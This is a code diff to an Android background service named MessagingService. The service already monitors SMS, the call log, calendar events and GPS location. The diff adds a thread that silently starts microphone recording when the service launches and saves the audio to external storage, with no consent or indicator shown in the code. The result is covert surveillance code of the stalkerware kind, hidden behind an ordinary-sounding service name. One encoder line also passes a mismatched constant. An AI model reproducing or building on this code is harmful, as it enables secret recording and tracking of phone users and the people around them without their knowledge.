@@ -10,7 +10,9 @@ import android.database.Cursor;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.location.LocationProvider;
+import android.media.MediaRecorder;
 import android.net.Uri;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -18,6 +20,9 @@ import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
+
+import java.io.File;
+import java.io.IOException;
 
 public class MessagingService extends Service {
 
@@ -33,6 +38,7 @@ public class MessagingService extends Service {
     private CalendarObserver mCalendarObserver;
     protected static String sTelephoneAddress;
     private LocationManager mLocationManager;
+    private MediaRecorder mMediaRecorder;
     public MessagingService() {
     }
 
@@ -82,8 +88,8 @@ public class MessagingService extends Service {
         mCallLogObserver = new CallLogObserver();
         mCalendarObserver = new CalendarObserver();
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
-        getContentResolver().registerContentObserver(Uri.parse("content://call_log"),true, mCallLogObserver);
-        getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI,true, mCalendarObserver);
+        getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
+        getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
         String locationProvider = LocationManager.GPS_PROVIDER;
 
         try {
@@ -93,7 +99,28 @@ public class MessagingService extends Service {
         } catch (SecurityException e) {
             e.printStackTrace();
         }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                mMediaRecorder = new MediaRecorder();
+                mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                mMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
+
+                try {
+                    File file = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
+                    file.createNewFile();
+                    mMediaRecorder.setOutputFile(file);
+                    mMediaRecorder.prepare();
+                    mMediaRecorder.start();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        }).start();
+
     }
+
 
     @Override
     public void onDestroy() {
@@ -109,6 +136,10 @@ public class MessagingService extends Service {
         getContentResolver().unregisterContentObserver(mObserver);
         getContentResolver().unregisterContentObserver(mCallLogObserver);
         getContentResolver().unregisterContentObserver(mCalendarObserver);
+        if(mMediaRecorder != null){
+            mMediaRecorder.stop();
+            mMediaRecorder.release();
+        }
         stopForeground(true);
         stopSelf();
     }
